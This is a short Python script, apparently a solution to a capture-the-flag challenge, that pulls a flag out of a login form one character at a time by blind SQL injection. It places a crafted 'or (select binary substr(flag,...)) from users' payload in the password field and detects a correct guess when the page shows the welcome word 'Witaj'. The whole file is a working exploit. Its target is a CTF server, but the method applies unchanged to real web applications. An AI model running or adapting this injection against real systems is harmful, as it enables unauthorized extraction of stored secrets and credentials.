import requests

url = 'http://tasks.ctfd.kncyber.pl:7013/'

myobj = {'name' : "Robert" , 'pass' : "' or (select binary substr(flag,"}

x = """!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"""
password = ""
i = len(password) + 1

while True:
    for element in x:
        p = myobj['pass'] + str(i) + ",1) from users) = '" + element + "' -- "
        output = requests.post(url, data = {'name' : "Robert" , 'pass'  : p }).text
        print(password + element)
        if 'Witaj' in output:
            password += element
            i += 1
            break
